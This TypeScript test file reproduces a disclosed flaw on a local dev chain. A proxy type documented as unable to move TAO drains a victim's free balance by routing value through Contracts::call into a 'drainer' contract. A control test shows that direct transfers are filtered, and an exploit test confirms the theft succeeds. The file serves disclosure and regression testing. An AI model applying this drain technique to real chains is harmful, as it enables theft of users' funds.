import { beforeAll, describeSuite, expect } from "@moonwall/cli";
import type { ApiPromise } from "@polkadot/api";
import type { KeyringPair } from "@moonwall/util";
import { hexToU8a, u8aConcat, u8aToHex } from "@polkadot/util";
import fs from "node:fs";
import { generateKeyringPair } from "../../../../utils/account";

const TAO = 1_000_000_000n;
const tao = (v: number): bigint => TAO * BigInt(v);

// Built from `ink-contract-drainer/` (see header note below).
const WASM_PATH = "./ink/drainer.wasm";
const CTOR_NEW = "0x11111111"; // constructor `new`, no args (explicit selector)
const SEL_STEAL = "0xdeadbeef"; // steal(beneficiary: AccountId), payable (explicit selector)

const GAS = { refTime: 10_000_000_000n, proofSize: 10_000_000n };

/** ink `steal` payload: selector ++ SCALE(AccountId) = 4 + 32 bytes. */
const encodeSteal = (beneficiary: Uint8Array) => u8aConcat(hexToU8a(SEL_STEAL), beneficiary);

async function forceSetBalance(api: ApiPromise, ctx: any, addr: string, amount: bigint) {
    await ctx.createBlock([
        await api.tx.sudo.sudo(api.tx.balances.forceSetBalance(addr, amount)).signAsync(ctx.keyring.alice),
    ]);
}

async function freeBalance(api: ApiPromise, addr: string): Promise<bigint> {
    const acc = (await api.query.system.account(addr)) as any;
    return BigInt(acc.data.free.toString());
}

/**
 * DEV reproduction of Finding 1 in its purest form: a `NonFungible` proxy —
 * documented "Nothing involving moving TAO" and denied `Balances::transfer_*` —
 * drains the victim's native FREE balance via `Contracts::call`.
 *
 *   `Contracts::call { dest, value }` debits `value` from the origin, and under
 *   `Proxy::proxy { real }` the origin is the victim. `ContractsCalls` is granted
 *   to `NonFungible` via `InfraCommonCalls`, so the filter is satisfied. The
 *   attacker's `drainer` contract accepts the value (payable) and terminates,
 *   sweeping it to a payout account.
 *
 *   T01 (control): the same proxy calling `transfer_keep_alive` directly is filtered.
 *   T02 (exploit): the same proxy draining via `contracts.call { value }` succeeds.
 */
describeSuite({
    id: "DEV_SUB_PROXY_CONTRACTS_DRAIN_FUNDS",
    title: "proxy — NonFungible drains native free balance via pallet-contracts",
    foundationMethods: "dev",
    testCases: ({ it, context }) => {
        let api: ApiPromise;
        let alice: KeyringPair; // sudo
        let victim: KeyringPair; // coldkey that delegates a NonFungible proxy
        let attacker: KeyringPair; // the delegate (deploys the drainer, signs the proxy call)
        let payout: KeyringPair; // fresh account that receives the stolen TAO (clean accounting)
        let contractAddress: string;

        const STEAL = tao(90_000); // leave the victim a buffer above ED

        beforeAll(async () => {
            api = context.polkadotJs();
            alice = context.keyring.alice;
            victim = generateKeyringPair("sr25519");
            attacker = generateKeyringPair("sr25519");
            payout = generateKeyringPair("sr25519");

            await forceSetBalance(api, context, victim.address, tao(100_000));
            await forceSetBalance(api, context, attacker.address, tao(100_000)); // fees + storage deposit

            // Attacker deploys the drainer contract.
            const code = u8aToHex(new Uint8Array(fs.readFileSync(WASM_PATH)));
            const {
                result: [inst],
            } = await context.createBlock([
                await api.tx.contracts
                    .instantiateWithCode(0, GAS, null, code, CTOR_NEW, "0x")
                    .signAsync(attacker),
            ]);
            expect(inst.successful, "drainer instantiation should succeed").toBe(true);
            const evs = (await api.query.system.events()) as any;
            const instantiated = evs.filter(
                (e: any) => e.event.section === "contracts" && e.event.method === "Instantiated"
            );
            expect(instantiated.length, "expected a contracts.Instantiated event").toBe(1);
            contractAddress = (instantiated[0].event.data as any).contract.toString();

            // Victim delegates the NonFungible proxy to the attacker.
            const {
                result: [ap],
            } = await context.createBlock([
                await api.tx.proxy.addProxy(attacker.address, "NonFungible", 0).signAsync(victim),
            ]);
            expect(ap.successful).toBe(true);
        });

        async function proxyExecutedResult(): Promise<{ ok: boolean; err?: string }> {
            const evs = (await api.query.system.events()) as any;
            const pe = evs.filter(
                (e: any) => e.event.section === "proxy" && e.event.method === "ProxyExecuted"
            );
            if (!pe.length) return { ok: false, err: "no ProxyExecuted event" };
            const result = (pe[pe.length - 1].event.data as any).result;
            if (result.isOk) return { ok: true };
            const de = result.asErr;
            let name = de.toString();
            if (de.isModule) {
                const m = api.registry.findMetaError(de.asModule);
                name = `${m.section}.${m.name}`;
            }
            return { ok: false, err: name };
        }

        it({
            id: "T01",
            title: "CONTROL: NonFungible proxy cannot transfer_keep_alive directly (filtered)",
            test: async () => {
                const victimBefore = await freeBalance(api, victim.address);
                const attackerBefore = await freeBalance(api, attacker.address);

                const inner = api.tx.balances.transferKeepAlive(attacker.address, STEAL);
                const {
                    result: [outer],
                } = await context.createBlock([
                    await api.tx.proxy.proxy(victim.address, null, inner).signAsync(attacker),
                ]);

                expect(outer.successful, "outer proxy extrinsic is included").toBe(true);
                expect((await proxyExecutedResult()).ok, "inner transfer_keep_alive must be FILTERED (Err)").toBe(false);

                // No funds moved (victim balance unchanged; attacker only paid the outer fee).
                expect(await freeBalance(api, victim.address)).toBe(victimBefore);
                expect(await freeBalance(api, attacker.address) <= attackerBefore).toBe(true);
            },
        });

        it({
            id: "T02",
            title: "EXPLOIT: same proxy drains the victim's free balance via contracts.call{value}",
            test: async () => {
                const victimBefore = await freeBalance(api, victim.address);
                const payoutBefore = await freeBalance(api, payout.address);
                expect(payoutBefore).toBe(0n);
                expect(victimBefore >= STEAL, "victim must hold at least the drained amount").toBe(true);

                // value is debited from the origin (= victim, because contracts.call is proxied
                // as `real`); the drainer accepts it (payable) and terminates to `payout`.
                const data = u8aToHex(encodeSteal(payout.addressRaw));
                const inner = api.tx.contracts.call(contractAddress, STEAL, GAS, null, data);
                const {
                    result: [outer],
                } = await context.createBlock([
                    await api.tx.proxy.proxy(victim.address, null, inner).signAsync(attacker),
                ]);

                // Contracts::call passes the NonFungible filter, so it dispatches...
                expect(outer.successful, "outer proxy extrinsic is included").toBe(true);
                expect((await proxyExecutedResult()).ok, "contracts.call passes the proxy filter (Ok)").toBe(true);

                // ...and the victim's native free balance was drained to the payout account,
                // through a proxy documented as unable to move TAO.
                const victimAfter = await freeBalance(api, victim.address);
                const payoutAfter = await freeBalance(api, payout.address);

                expect(victimBefore - victimAfter > (STEAL * 9n) / 10n, "victim lost ~the drained amount").toBe(true);
                expect(payoutAfter - payoutBefore > (STEAL * 9n) / 10n, "payout received ~the drained amount").toBe(
                    true
                );
            },
        });
    },
});
